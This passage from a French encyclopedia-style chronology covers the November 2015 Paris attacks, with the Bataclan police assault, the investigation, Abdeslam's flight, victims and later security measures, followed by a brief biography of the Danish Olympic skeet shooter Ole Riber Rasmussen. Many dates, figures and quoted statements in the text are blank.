l'obligent à assister au massacre alors qu'ils tirent depuis le balcon.
Début de l'intervention des forces de l'ordre et des secours.
Intervention de la BAC de nuit du Val-de-Marne (22 h 00 - 22 h 15).
Les policiers de la BAC de nuit du Val-de-Marne sont les premières forces de l'ordre à arriver sur place à . À leur arrivée, ils constatent que des personnes fuient la salle par la sortie de secours située dans le passage Saint-Pierre-Amelot. Ils se positionnent à un angle de ce passage avec le Boulevard Voltaire et rendent compte par radio de ce qu’ils voient : "". Ils sont, à quatre reprises, la cible de tirs de Kalachnikov depuis l’issue de secours du Bataclan. Plusieurs fois, ils ripostent au moyen de fusils à pompe. Les échanges de tirs s’écoulent sur une période de près de dix minutes.
Après la deuxième ou la troisième rafale, les policiers sont rejoints par quatre militaires de l’opération Sentinelle. L'un d'eux sollicite alors l’autorisation de les engager afin de pouvoir atteindre le terroriste embusqué derrière l’issue de secours du Bataclan. Il reçoit pour réponse : '. Le maréchal des logis chef commandant le groupe de militaires intervenu au Bataclan indique quant à lui devant la commission que les militaires n’ont pu ouvrir le feu car ils ne disposaient ' et a ajouté que, dans le cas contraire, ils auraient "".
Parallèlement, le commissaire de la BAC et son chauffeur pénètrent dans le Bataclan par l’entrée principale vers , et progressent rapidement dans la salle, favorisés – sans le savoir – par le fait qu’un des terroristes a déjà gagné l’étage tandis qu’un autre est aux prises avec les effectifs de la BAC au niveau du sas de l’issue de secours. Arrivés devant le bar situé à proximité de l’entrée de la salle de spectacle, ils aperçoivent le troisième terroriste sur la scène, mettant en joue un otage, les mains sur la tête, à qui il ordonne de s’allonger sur le sol. Ils tirent à six reprises avec leurs armes de poing, à une distance d’une vingtaine de mètres et l’abattent à . Au même moment, le terroriste Samy Amimour parvient à actionner son gilet rempli d’explosifs, projetant la tête et une jambe du terroriste sur la scène. Dans les instants qui suivent, des tirs venus du balcon intérieur obligent le commissaire divisionnaire et son chauffeur à s’abriter puis à sortir de la salle par l’entrée principale tandis que deux cents à trois cents personnes sortent par la sortie de secours du passage Saint-Pierre Amelot – laissant ainsi supposer que le deuxième terroriste qui y était embusqué a alors, lui aussi, rejoint l’étage.
Les deux terroristes restants rassemblent une vingtaine d'otages et se retranchent dans un bureau au premier étage. Depuis les fenêtres de ce bureau, des tirs sont échangés avec les forces de l'ordre postés au coin du boulevard Voltaire et du passage Saint-Pierre-Amelot. L'un des terroristes se sert de son fusil d'assaut AKKS bulgare pour abattre volontairement, d'une balle dans le dos, un locataire d'un studio situé dans l'immeuble en face du passage longeant la salle de spectacle. Par la suite, les deux hommes demandent aux otages d'appeler BFM TV, et les forcent à faire le guet aux fenêtres.
Intervention de la BRI et début de la prise d'otages au Bataclan (22 h 15 - 00 h 18).
À , la salle d’information et de commandement de la direction régionale de la police judiciaire de Paris apprend qu'une prise d’otages est en cours dans la salle de spectacle du Bataclan. La première colonne de la BRI de Paris, la force d’intervention rapide (FIR), reçoit alors pour consigne de se détourner de sa mission initiale (elle devait se rendre rue de Charonne, vingt minutes après la fin de la fusillade de l'équipe des terrasses) et de rejoindre la salle de spectacle. Une seconde colonne, composée de quinze fonctionnaires, prend la direction du restaurant La Belle Équipe. Au même moment, le préfet de police de Paris, M. Michel Cadot, arrive au Bataclan.
Le commissaire divisionnaire de la BAC, déjà intervenu à l'intérieur du bâtiment, entendant de nouveaux coups de feu, entre une deuxième fois dans le Bataclan, accompagné d'une dizaine de policiers. Un échange de tirs s'ensuit puis les tirs cessent. À partir de ce moment, d'après Christophe Molmy qui dirige les opérations pour la BRI, "".
À , les quinze fonctionnaires de la force d’intervention rapide de la BRI de Paris arrivent au Bataclan et progressent lentement au rez-de-chaussée. Ils sont rejoints entre 22h30 et 22h35 par la deuxième colonne de la BRI de Paris, qui a d’abord atteint le restaurant La Belle Équipe, portant le nombre de fonctionnaires de la BRI à trente. Ce renfort permet d’accélérer l’évacuation des otages. Des spectateurs s'échappent de chaque porte de toilettes ouverte, certains se sont dissimulés dans les faux plafonds.
Vers , les policiers de la BRI commencent à progresser dans les escaliers, ce qui permet à certains spectateurs, encore dissimulés dans la salle à ce moment-là, de quitter les lieux. Elle est stoppée dans son avancement à par une porte close derrière laquelle se trouvent les deux terroristes et une douzaine d’otages. Les policiers entendent l'un d'eux crier : "" Puis, désigné comme porte-voix par les terroristes, un des otages communique aux policiers un numéro de téléphone sur lequel ils peuvent les joindre.
Le policier négociateur va alors entamer pendant près d'une heure un dialogue depuis l'extérieur du bâtiment, installé dans un véhicule banalisé avec un collègue et la psychologue de la BRI. Cinq appels sont passés entre et . Les terroristes demandent à la BRI de les laisser sortir. Un policier raconte : ' Après le deuxième appel, à , le policier négociateur informe Christophe Molmy qu'il ne pense pas obtenir de reddition, et demande au préfet de police de Paris ainsi qu'au directeur de la police judiciaire l'autorisation de donner l'assaut, qui sera accordée à . Entre-temps, trois autres appels ont lieu, dans le seul but de gagner du temps de façon à obtenir des responsables du Bataclan des indications sur la configuration des lieux et à permettre aux policiers de s'organiser. À , un troisième appel a été passé : les terroristes ' confiera plus tard le policier négociateur.
Renforts et mise en alerte du RAID et du GIGN (22 h 04 - 00 h 18).
À , le RAID est mis en alerte tandis que l’adjoint au chef de l’unité se rend au ministère de l’Intérieur pour y attendre l'arrivée des premiers effectifs – les effectifs rapides. Trois minutes plus tard, Jean-Michel Fauvergue, le chef du RAID, déclenche l’alerte générale, c’est-à-dire le rappel de tous les effectifs. En outre, toutes les antennes du RAID situées à Bordeaux, Lille, Lyon, Marseille, Nice, Rennes et Strasbourg sont mises en pré-alerte.
À , l’adjoint au chef du RAID arrive devant le Bataclan. Il est rejoint par l’équipe rapide d’intervention (ERI) du RAID (créée après les attentats de janvier 2015), qui compte neuf hommes, à puis par le chef du RAID, à , accompagné d'une deuxième colonne d’assaut. Une troisième colonne d’assaut du RAID arrive au Bataclan à .
À , le GIGN est mis en alerte. À , vingt-cinq militaires du GIGN emmenés par leur commandant, quittent Satory. Dix minutes plus tard, vingt militaires supplémentaires font de même tandis que le commandant du GIGN appelle l’officier de liaison placé auprès du préfet de police de Paris pour offrir les services de son unité à la BRI de Paris et au RAID. Compte tenu des forces sur place, ils ne sont toutefois pas sollicités.
Assaut final (0 h 18 - 0 h 23).
À , l’assaut final est donné, sur autorisation du préfet de police de Paris, par les fonctionnaires de la BRI de Paris, soutenus par les effectifs du RAID, positionnés au rez-de-chaussée. Progressant, dans un couloir très étroit, sous le feu des Kalachnikov, la colonne policière enjambe les otages, bouclier tactique Ramsès en tête, et les exfiltre les uns après les autres jusqu’à parvenir à neutraliser les deux terroristes et à libérer tous les otages, vivants. Au cours de l’assaut, l’un des kamikazes, Ismaël Omar Mostefaï, réussit à actionner son gilet explosif, tuant également l’autre terroriste Foued Mohamed-Aggad, soufflé par la déflagration, et blessant grièvement un policier de la BRI.
L'assaut a duré cinq minutes, et tous les otages sont évacués sains et saufs lors de cette ultime action des forces de l'ordre.
Organisation des secours.
À , le commandant des opérations de secours (COS) demande l'appui de dix VSAV en prévision d’un bilan qui pourrait s’alourdir et afin d’anticiper la manœuvre d’évacuation des victimes.
Dès , le commandant de la brigade de sapeurs-pompiers, le général Philippe Boutinaud, est sur place et assure le commandement des opérations de secours sur tout le dispositif engagé par la brigade de sapeurs-pompiers de Paris. Il est accompagné du professeur Jean-Pierre Tourtier, directeur des secours médicaux du site, un médecin régulateur du SAMU et le professeur Pierre Carli, directeur médical du SAMU de Paris. Le plan « Rouge Alpha » est déclenché à .
Une zone d’exclusion police est mis en place selon la doctrine médicale d’intervention du RAID, au sein de laquelle sont identifiées les zones de combat et de reprise (qui se confondaient avec le bâtiment du Bataclan). Celle-ci recouvre le bâtiment du Bataclan, la majeure partie du passage Saint-Pierre Amelot et le boulevard Voltaire de la rue Oberkampf jusqu’au boulevard Richard-Lenoir.
De ce fait, les équipes de secours n’ont pas accès à la salle de spectacle, qui se situe alors à l’intérieur de cette zone d’exclusion. Dans les premières minutes, les victimes sont donc regroupées par les policiers dans le hall du bâtiment, entre les portes extérieures et les portes intérieures, où se constitue un "" à l'écart de la zone de combat. Elles sont ensuite évacuées, toujours par les policiers, à l’aide de barrières Vauban servant de brancards dans les premiers instants (des brancards seront ensuite fournis par les équipes de secours au fur et à mesure de leur montée en puissance) vers les trois postes médicaux avancés que les sapeurs-pompiers et le SAMU installent dans le même temps aux 22, 26 et 29, rue Oberkampf. Cette noria d’évacuation ne va cesser jusqu’à l’assaut final donné par les forces d’intervention spécialisées.
14 - 30 novembre 2015 : post-attentat.
Enquête.
Gestion de crise.
L'audition de M. François Molins, procureur de la République par le tribunal de grande instance de Paris, et de Camille Hennetier, vice-procureure au parquet anti-terroriste du tribunal de grande instance de Paris, devant la commission des lois de l'assemblée nationale le 9 décembre 2015 permet de préciser le dispositif de gestion de crise mis en place à la suite des attentats.
Le vendredi 13 au soir, dès 21h30, une cellule de crise composée de 35 magistrats figurant sur une liste établie au préalable, appelés à rejoindre immédiatement la section anti-terroriste du parquet de Paris est activée. Elle a pour objet d'assurer la coordination des services , la sécurité juridique des actes et la direction de l'enquête. Plus de de la police judiciaire sont mobilisés, auxquels s'ajoutent ceux de la DGSI. Ce nombre important de personnes est en rapport avec la coordination des investigations, les autorisations à établir pour les géolocalisations, les perquisitions de nuit ou les interceptions téléphoniques. Cette cellule de crise a fonctionné jusqu'au mercredi 25 novembre, de jour comme de nuit avec comme tâches principales : analyse des procès-verbaux, contact avec les enquêteurs, synthèses des auditions, sachant que plus de ont été entendus, rédaction des réquisitions, etc.
Le dimanche 15 novembre, il est décidé de constituer une équipe commune d'enquête avec la justice belge, qui est en place le 16 novembre.
Fuite de Salah Abdeslam.
Dans la nuit du 13 au 14, Salah Abdeslam que l'on soupçonne d'avoir convoyé aux abords du Stade de France les trois terroristes qui s'y sont fait exploser, à bord d'une Clio noire qu'il a ensuite abandonnée Place Albert-Kahn, a peut-être renoncé à se faire sauter dans le arrondissement et cherche à échapper à la police et quitter Paris. À 22 h 29, il se rend dans un cybercafé de la rue Doudeauville où il achète un téléphone et une carte SIM. Il appelle d'abord son cousin parisien, le suppliant de . Le cousin refuse en lui répondant . lui répond Abdeslam. Il contacte alors ses amis belges, Mohamed Amri et Hamza Attou, résidant à Molenbeek, respectivement barman et revendeur de cannabis au café des Abdeslam. Après les avoir convaincu de venir le chercher à Paris, il leur donne ses indications par texto depuis l'allée Vauban à Châtillon (Hauts-de-Seine) où il se cache à partir de minuit.
À 2 h 22, il appelle ses amis : Amri reçoit le dernier texto de Abdeslam à 5 h 27 juste avant d'arriver. Ils le décrivent alors , puis menaçant : Et pour les persuader il se vante d'avoir abattu des gens à la kalachnikov, ajoutant que son frère Brahim s'est fait exploser et que lui, le seul survivant, est le terroriste. Pour éviter les contrôles policiers, Salah Abdeslam demande à ses convoyeurs d'emprunter les petites routes, mais le trio se perd et retrouve l'autoroute de Belgique. Ils n'évitent donc pas les barrages et subissent trois contrôles en France.
Selon le récit d'Attou, . Abdeslam reste silencieux sur la banquette arrière. Amri et Attou répondent puisqu'ils viennent de fumer un joint. Ce n'est qu'au deuxième contrôle qu'on leur demande leurs papiers. Au dernier, sur l'autoroute A2 près de Cambrai, Abdeslam donne même son adresse de Molenbeek. À cet instant, il n'est pas encore recherché.
Arrivé dans la banlieue de Bruxelles, le trio s'arrête devant une banque. Accompagné par un de ses chauffeurs, Abdeslam sort du véhicule et se rend sur un marché pour acheter divers vêtements, puis enfile le tout dans la camionnette d'un commerçant. Dans une boutique voisine, il achète cette fois un nouveau téléphone portable avant de s'arrêter chez un coiffeur. Au deuxième salon, il se ravise, se coupe les cheveux à ras, et se fait raser un trait sur le sourcil ». Le trio repart et s'arrête plus loin où un autre ami d’Abdeslam les rejoint dans un café. Le fugitif explique alors sa stratégie : éviter le quartier de Molenbeek, où il réside et rejoindre une planque à Schaerbeek, un autre quartier de Bruxelles, où il affirme que quelqu'un l'attend. Au moment de se rendre à Schaerbeek, Abdeslam est très pâle. Il détruit son ancien téléphone, puis est conduit en voiture à l'adresse qu'il souhaitait. Là, il abandonne définitivement ses exfiltreurs. , se rappelle l'un d'eux.
Attou appelle dans la nuit de vendredi à samedi un certain Ali Oulkadi qui est un ami de Brahim Abdeslam. Samedi à midi, Attou retrouve à Laeken Ali Oulkabi qui les convoie avec son véhicule personnel. Il découvre la compagnie de Salah Abdeslam et ses actes. Après avoir pris un café, Ali Oulkabi dépose Salah Abdeslam à Schaerbeek où l'on perd sa trace.
Opération policière à Saint-Denis le 18 novembre.
Un renseignement parvenu aux enquêteurs le 16 novembre, en fin d'après-midi, fait état de la présence d'individus en lien avec les attentats dans une zone industrielle d'Aubervilliers, rue Marcel Carné. Seule une dizaine de personnes du ministère de l'Intérieur et à l'Élysée connaît alors cette information. Les enquêteurs de terrain en sont informés le mardi 17 et, pour avoir la preuve par l'image, installent une caméra en début d'après-midi en direction d'un bosquet en contrebas de l'A86. Vers 18 h 30, ils aperçoivent un homme en costume-cravate s'engager dans les fourrés, mais il s'agit d'une fausse alerte. A 20 h 10, une jeune femme s'approche des fourrés, un téléphone mobile à l'oreille. Les enquêteurs reconnaissent Hasna Aït Boulahcen, la cousine d'Abaaoud. Puis, une minute plus tard, un homme, identifié plus tard comme étant Chakib Akrouh, sort des bosquets et s'avance à découvert. La femme est toujours là, qui s'agite, assise sur un plot. À 20 h 13, une deuxième silhouette émerge à son tour de la végétation. Malgré le bonnet sombre qui lui masque une partie du visage, les policiers identifient bien Abaaoud. Ils reçoivent l'ordre de ne pas intervenir et de prendre en filature le taxi dans lequel ils montent. Les trois personnes sont déposées rue du Corbillon, à Saint-Denis, et entrent dans un immeuble vétuste, à 22 h 14.
Le , les forces de l'ordre, Raid, BRI, police, secours, prennent place dans le centre-ville. À l'assaut est donné sur un appartement, présenté par certains médias comme un squat, situé de la République. La porte de l'appartement résiste dans un premier temps aux charges explosives du RAID, ce qui permet aux terroristes de préparer leur riposte. L'attaque dure plusieurs heures face à des terroristes retranchés à l'intérieur. L'intervention, se termine vers . À l'issue de cette intervention, Abdelhamid Abaaoud, sa cousine Hasna Aït Boulahcen et Chakib Akrouh trouvent la mort.
Fin de l'enquête de flagrance.
Avec l'assaut contre l'appartement conspiratif et l'interpellation du logeur, Jawad Bendaoud, l'enquête de flagrance s'achève. Celle-ci, d'une durée de huit jours, est en effet renouvelable une fois. Le placement de M. Bendaoud en garde à vue débouche sur l'ouverture d'une information judiciaire confiée à six juges d'instruction. Il est mis en examen et placé en détention provisoire. Le dossier est désormais entre les mains des juges d'instruction.
Impliqués.
Parmi les neuf auteurs des tueries du 13 novembre, huit sont morts et un est en fuite. Six des morts sont identifiés : Bilal Hadfi, un Français de 20 ans résidant en Belgique, est un des kamikazes du Stade de France. Brahim Abdeslam, Abdelhamid Abaaoud et Chakib Akrouh seraient les trois auteurs des fusillades sur les terrasses du arrondissement. Ismaël Omar Mostefaï, Samy Amimour et Foued Mohamed-Aggad sont les trois attaquants du Bataclan. Les deux morts du Stade de France étaient porteurs de faux passeports et restent donc non identifiés.
Logistique.
Un véhicule de type Seat León III aperçu sur les lieux des attentats et contenant des armes (trois fusils d’assaut kalachnikov, onze chargeurs vides et cinq pleins) est retrouvé dans la nuit du 14 au à Montreuil, en face d'une ancienne mosquée, aujourd'hui détruite. Une Renault Clio IV noire immatriculée en Belgique, louée par Salah Abdeslam, est découverte place Albert-Kahn (arrondissement) le , laissant penser à l'existence d'une quatrième équipe en plus des trois passées à l'action.
Victimes.
Un premier bilan des attentats établi le 14 novembre fait état de 129 morts : 89 au Bataclan dont un riverain tué par une balle perdue ayant ricoché sur son balcon (des témoignages indiqueront par la suite que ce dernier a en réalité été tué volontairement par l'un des terroristes), 13 sur les terrasses du bistrot le Carillon et du restaurant Le Petit Cambodge, 5 sur celles du restaurant Casa Nostra et de la brasserie Bonne Bière, 1 aux abords du stade et 21 au restaurant La Belle Équipe. 352 blessés sont par ailleurs dénombrés. Un seul policier est blessé (à la main, par une balle ayant ricoché). Les membres du groupe de rock américain Eagles of Death Metal et leur équipe sont sains et saufs, sauf Nick Alexander, leur responsable du merchandising, qui a été tué.
Le 20 novembre, le nombre de morts monte de 129 à 130 après le décès d'un blessé du Bataclan. Le nombre de victimes hospitalisées s’élève encore à 169 le 24 novembre, soit 11 jours après les attentats.
Le 27 novembre, François Hollande préside une cérémonie d’hommage national aux victimes dans la cour de l'hôtel des Invalides. À cette occasion, il demande aux Français de pavoiser leur domicile toute la journée. C'est la première fois que des civils sont honorés dans le panthéon militaire.
Sécurité.
Mesures prévues en France.
L’état d’urgence est décrété par le chef du gouvernement le et est prolongé de trois mois au-delà des légaux définis par la loi de 1955, soit jusqu’au 26 février 2016. La loi de prorogation contient diverses dispositions modifiant les modalités d’intervention des forces de l’ordre et judiciaires pendant cet état d’urgence. Certaines de ces nouvelles dispositions peuvent être jugées non compatibles avec la Constitution ce qui conduit le gouvernement à réviser celle-ci, en instaurant en particulier un "régime civil de crise". Une incompatibilité peut aussi être relevée avec la Convention européenne des droits de l'homme, raison pour laquelle le gouvernement demande au Conseil de l'Europe une dérogation le 24 novembre 2015.
Mesures prévues en Belgique.
Le samedi 21 novembre, la Région de Bruxelles-Capitale passe en alerte maximale, de niveau 4, avec métro, musées et magasins fermés et forces de l'ordre massivement déployées, blindés et forces armées dans les rues. Les spectacles (dont ceux de Johnny Hallyday) et les rencontres sportives sont annulés. Les autorités craignent une menace « imminente » d'attentat dans la capitale belge. Cet état de siège se prolonge le lundi suivant où le métro et toutes les écoles et universités de la capitale restent fermés, ainsi que des salles de spectacles et nombre de commerces. Ces mesures sont prolongées le mardi. Les établissements d'enseignement et le métro rouvrent progressivement à partir du mercredi suivant. Le niveau d’alerte est ramené au niveau 3 le jeudi 26 novembre.
International.
L'ampleur de ces attaques est telle que leur retentissement est planétaire, à l'instar des attentats de janvier 2015. Du 13 au 14 novembre 2015, la plupart des pays émettent des messages de condoléances aux victimes et de soutien au peuple français sous différentes formes (messages sur Twitter, déclarations solennelles, courriers, etc).
Politique.
Le , Juliette Méadel est nommée secrétaire d'État auprès du Premier ministre, chargée de l'Aide aux victimes, dédiée aux victimes des attentats.
Décembre 2015.
Enquête.
Le décembre, Mohamed S. est arrêté en France et placé en garde à vue. Il est soupçonné d'avoir été un intermédiaire entre la cousine d'Abdelhamid Abaaoud, qui lui cherchait un abri de repli, et Jawad Bendaoud, présenté comme un de Saint-Denis.
Le 4 décembre, la police belge annonce que deux nouveaux suspects sont . Le 9 septembre, Salah Abdeslam, qui s’est rendu en Hongrie à deux reprises au mois de septembre, a en effet été contrôlé à la frontière austro-hongroise alors qu’il se trouvait à bord d'une Mercedes avec ces deux hommes munis de faux papiers.
Le 9 décembre, l’identité du troisième terroriste ayant attaqué le Bataclan est révélée par la police française. Il s’agit de Foued Mohamed-Aggad, un Français de 23 ans originaire de Wissembourg. Il serait parti en décembre 2013 pour la Syrie avec son frère aîné Karim et sept autres jeunes radicalisés (la plupart du quartier de la Meinau à Strasbourg où a grandi Mohamed-Aggad), qui tous rentrent en France après la mort de deux frères membres du groupe. Seul Mohamed-Aggad reste en Syrie. Il s'y marie avec une française.
Le 11 décembre 2015, Samy Boukefous, habitant de Romilly-sur-Seine (Aube), âgé de 33 ans et considéré comme proche de la famille d’Omar Ismaïl Mostefaï, l'un des assaillants du Bataclan, est condamné par le tribunal correctionnel de Troyes à de prison ferme pour apologie du terrorisme. Le tribunal est allé au-delà des réquisitions du procureur qui avait réclamé trois ans de prison dont un ferme. Le prévenu, qui avait été interpellé le 17 novembre et était jugé en comparution immédiate, est reconduit en prison à l’issue de l’audience.
Le 15 décembre 2015, un homme de 29 ans est interpellé à son domicile à Villiers-sur-Marne, dans le Val-de-Marne, et placé en garde à vue. Selon une information confirmée à l'AFP par une source judiciaire, il gravitait dans l'entourage de la cousine d'Abaaoud dont le rôle éventuel est à déterminer.
Le 18 décembre 2015, la chambre des mises en accusation de la Cour d’appel de Bruxelles déclare non fondé l’appel de Samir Zarioh, arrêté le 29 novembre et soupçonné d’être un proche de Bilal Hadfi, un des kamikazes du stade de France et prolonge la détention préventive du suspect d’un mois supplémentaire.
Deux nouveaux individus sont interpellés dans le centre de Bruxelles le dimanche 20 décembre. L'arrestation de ces deux frères est, selon le parquet fédéral, en lien avec les attentats mais pas directement avec la recherche de Salah Abdeslam. Ils sont finalement relâchés le lundi, ainsi que trois autres personnes qui avaient été interpellées dans le même cadre.
Le 21 décembre, un nouveau nom apparaît dans l'enquête : Charaffe el-Mouadan pourrait avoir coordonné l’attaque du Bataclan. L’un des témoins rescapés affirme en effet avoir entendu l’un des terroristes demander à un autre s'il , nom par lequel se fait appeler Charaffe el-Mouadan. Français de 27 ans, originaire de Drancy (Seine-Saint-Denis), il avait été mis en examen en 2012 avec Samy Amimour, l'un des tueurs présents dans la salle de spectacle le 13 novembre, pour association de malfaiteurs en vue de préparer des actes de terrorisme. Il comptait en effet gagner le Yémen ou l’Afghanistan avec Amimour et un troisième homme du nom de Samir Bouabout pour y faire le jihad. Charaffe el-Mouadan, décrit comme le leader du trio, avait suivi des cours de tir au sein de l’Association nationale de tir de la police (ANTP), à Paris. Les trois hommes avaient été entendus par les enquêteurs de la Direction générale de la sécurité intérieure (DGSI). Ils avaient affirmé avoir abandonné leur projet. Un an après, Charaffe el-Mouadan s’était rendu en Syrie.
Dans le volet belge de l'enquête, de nouveaux éléments concernant Ali Oulkadi sont publiés par les médias belges le 24 décembre. Ali Oulkadi, qui a conduit Salah Abdeslam le lendemain des attentats depuis la station de métro Bockstael à Laeken jusqu’à Schaerbeek, prétend qu’il ignorait le 14 novembre être sur le point d’embarquer Salah Abdeslam dans son véhicule. Or dans les procès-verbaux consultés par le journal L’Avenir apparaissent téléphoniques entre lui et Salah Abdeslam pendant la période allant du 19 août au 2 octobre. De plus, alors que Salah Abdeslam contacte Hamza Attou pour l’exfiltrer, ce dernier appelle Oulkadi quelques instants plus tard, selon les données de téléphonie. Il aurait également eu 109 conversations téléphoniques avec Brahim Abdeslam, qui a déclenché sa ceinture d’explosifs sur le boulevard Voltaire, entre le 17 septembre et le 14 novembre.
Victimes.
Le décembre, une rescapée du Bataclan, Laura Croix, sort du coma artificiel dans lequel elle avait été plongée le 13 novembre. La chanteuse avait reçu trois balles dans la poitrine et trois dans l’abdomen. Deux de ses doigts de la main gauche ont été sectionnés. Au 3 décembre, 74 personnes sont toujours hospitalisées en Île-de-France.
Impliqués.
Un des trois auteurs de l'attaque du Bataclan, Samy Amimour, est inhumé le 24 décembre au carré musulman cimetière intercommunal de La Courneuve dont relève la commune de Drancy, d'où il est originaire.
Sécurité.
Le , le gouvernement lance une campagne de communication sur les réflexes à avoir en cas d’attaque terroriste. S'échapper (ou se cacher) et alerter, telles sont les trois étapes à respecter en cas d'attaque terroriste, selon la fiche réflexe diffusée par le gouvernement. L'affiche, reprenant dans la forme la signalétique des consignes de sécurité présentes à bord des avions, devrait être diffusée et affichée dans les lieux publics : établissements scolaires, stades, aéroports, salles de concert ou de spectacle, préfectures, mairies, grands magasins et gares. Elle sera également diffusée sur Internet et sur les réseaux sociaux pour permettre à tout un chacun de la consulter, de l'imprimer ou de l'afficher dans un lieu utile. Elle doit être ultérieurement complétée par une vidéo.
Le lendemain, le , le ministère de l'éducation nationale diffuse une nouvelle affiche présentant certaines consignes de sécurité dans le cadre du plan Vigipirate, désormais appliqué dans les établissements scolaires du pays. Parmi ces consignes, on peut y trouver l'interdiction de stationner aux abords des écoles, l'accueil par un adulte à l'entrée, le contrôle visuel des sacs et la vérification d'identité des personnes externes.
Le gouvernement présente au Conseil des ministres du 23 décembre 2015 un projet de loi constitutionnel visant à donner une base constitutionnelle à l'état d'urgence et prévoyant l'extension de la déchéance de la nationalité aux binationaux nés français. Il doit être débattu à l'Assemblée nationale à partir du . Le premier ministre Manuel Valls présente lors de ce même conseil des ministres les grands principes du futur « projet de loi renforçant la lutte contre la criminalité organisée, son financement, l’efficacité et les garanties de la procédure pénale » qui doit être soumis en janvier au Conseil d’État et qui doit intégrer des éléments de lutte contre le blanchiment, issus d’un texte présenté par le ministre des finances, Michel Sapin ; des propositions du ministère de l’intérieur en matière de surveillance de certains éléments radicaux ; et d’autres mesures proposées par la justice portant sur les compétences du parquet.
2016.
Janvier 2016.
Victimes.
Deux associations de victimes sont constituées respectivement le 9 janvier 2016, l’association « "13 novembre : fraternité et vérité" », et le 13 janvier, « "Life for Paris - 13 novembre 2015" ». Toutes deux constituées par des victimes et proches de victimes de l’ensemble des sites touchés, elles ont des objets similaires : permettre aux victimes et à leurs proches de se rencontrer, les accompagner dans la défense de leurs droits et agir pour la manifestation de la vérité.
Deux établissements, frappés par les attentats du , rouvrent leurs portes : La brasserie "Events" de Saint-Denis le 12 janvier et le restaurant "Le carillon" le 13 janvier. Ces ouvertures interviennent après celles de "À la bonne bière" le 4 décembre et du "Comptoir Voltaire" le .
Avril 2016.
Le 19 avril 2016, le ministre de l’Intérieur, Bernard Cazeneuve, présente un schéma national d’intervention des forces de sécurité visant à répondre aux besoins d’urgence et d’efficacité engendrés par une menace terroriste protéiforme.
En cas d’attaque terroriste, le facteur temps est devenu l’élément déterminant pour limiter au maximum le nombre des victimes. Le schéma fixe un délai maximum de 20 minutes pour mobiliser partout en France une colonne du RAID, du GIGN ou de la BRI en cas d'attaque terroriste. Pour cela, 7 nouvelles antennes viennent renforcer les 22 unités d'intervention existantes pour assurer une couverture optimale de l’ensemble du territoire national, en métropole et outre-mer : 4 nouvelles antennes du GIGN (Nantes, Reims, Tours et Mayotte) et 3 nouvelles antennes du RAID (Toulouse, Montpellier et Nancy).
Les forces d’intervention doivent disposer d’un haut niveau de préparation et de coordination pour intervenir. Afin d'éviter une rivalité entre les différentes forces d'élite, la coopération entre police et gendarmerie est élargie : en cas de crise grave ou d'attaque d'envergure, les traditionnelles zones de compétences qui créent des frontières dans l'intervention des gendarmes et des policiers seront suspendues. Une fonction de commandant et de coordinateur des opérations d’intervention spécialisée lors d’une crise terroriste, notamment en cas de pluralité de forces d’intervention, est également créée.
Juin 2016.
Une enquête sur la mémoire, baptisée programme 13 novembre, menée conjointement par le Centre national de la recherche scientifique (CNRS), l’Institut national de la santé et de la recherche médicale (Inserm) et l'Hesam Université est lancée simultanément à Paris, Caen et à Metz. Un appel aux volontaires est lancé aux proches de victimes, dont plusieurs en Lorraine, à Metz et Nancy, ou tout simplement à ceux qui ont suivi cette tragédie par le biais des médias. La finalité de cette étude est d'étudier la construction et l’évolution de la mémoire sur cet événement. Des médiateurs, des enquêteurs et des chercheurs vont recueillir puis analyser les témoignages d’un groupe de volontaires, au cours de quatre campagnes d’entretiens filmés réparties sur . Les mêmes personnes seront interrogées à quatre reprises. Ces témoignages individuels seront mis en perspective avec les traces de la mémoire collective telle qu’elle se construit au fil des années. Par ailleurs pour comprendre quels sont les effets d’un événement traumatique sur les structures et le fonctionnement du cerveau, les chercheurs étudieront les marqueurs neurobiologiques de la résilience au traumatisme chez un sous-groupe de 180 personnes.
Novembre 2016.
Commémorations du premier anniversaire du 13-Novembre.
Six plaques commémoratives sont dévoilées le sur les lieux des attaques. Sur celle du Stade de France, on peut lire "". Le fils de Manuel Dias prononce un discours remarqué. Chacune des plaques posées à Paris arbore le texte suivant : suivies des noms des victimes, par ordre alphabétique. La première cérémonie commence à au Stade de France puis se poursuit dans le devant le café Le Carillon et le restaurant Le Petit Cambodge, puis dans le , devant les terrasses de La Bonne Bière, du Comptoir Voltaire et de la Belle équipe puis au Bataclan.
La Ville de Paris et l'afficheur JCDecaux font afficher sur publicitaires et de nombreux panneaux lumineux. L'association « Life for Paris » organise un lâcher de ballons à , devant la mairie du de Paris, cérémonie qui s’achève par l'hommage musical d’une pianiste, qui est intervenue dans la nuit du 13 novembre 2015 en tant que personnel soignant, et un chœur de gospel qui offrira un chant d’espoir. L'association « 13onze15-Fraternité-Vérité » organise quant à elle un rassemblement de , des rescapés et des familles de victimes, dans Paris à la mi-journée. Elle appelle à placer une bougie à la fenêtre à la tombée de la nuit. Le cardinal André Vingt-Trois, archevêque de Paris, préside à une messe d’hommage en la cathédrale Notre-Dame. Des milliers de lanternes flottantes bleues, blanches ou rouges sont lâchées sur le canal Saint-Martin, alors que plusieurs centaines de personnes se regroupent, allument des bougies ou déposent des fleurs place de la République ou sur les lieux des attentats.
Décembre 2016.
Un employé de la sécurité civile de qui s’était fait passer pour une victime psychologique de l'attaque du Bataclan, est jugé par le tribunal correctionnel de Versailles pour tentative d’escroquerie. Il est condamné à deux ans de prison, dont six mois ferme, avec maintien en détention au terme du procès.
Deux artistes danois réalisent à Berlin un « Musée des martyrs », où les photos d'Ismaël Omar Mostefaï et Mohammed Atta, chef du commando du 11 Septembre 2001, côtoient celles de Socrate ou Martin Luther King suscitent l'indignation générale.
2018.
Juillet 2018.
Jules Frutos et Olivier Poubelle revendent les 30 % du Bataclan qu'ils possèdent au groupe Lagardère, qui en détenait le solde et souhaite relancer le lieu. La salle suscite encore des hésitations chez les artistes si bien qu'en 2018 seulement environ ont été programmés.
Voir aussi.
Liens externes.
Rapport fait au nom de la commission d'enquête relative aux moyens mis en œuvre par l’État pour lutter contre le terrorisme depuis le 7 janvier 2015 :

</doc>
<doc id="9625679" url="https://fr.wikipedia.org/wiki?curid=9625679" title="Ole Riber Rasmussen">
Ole Riber Rasmussen

Ole Riber Rasmussen, né le à Gladsaxe et mort le , est un tireur sportif danois.
Carrière.
Ole Riber Rasmussen remporte la médaille d'argent aux épreuves de tir aux Jeux olympiques d'été de 1984 se tenant à Los Angeles en skeet. Il dispute aussi les épreuves de skeet des Jeux olympiques d'été de 1988 à Séoul, des Jeux olympiques d'été de 1992 à Barcelone et des Jeux olympiques d'été de 1996 à Atlanta, terminant respectivement , et .

</doc>
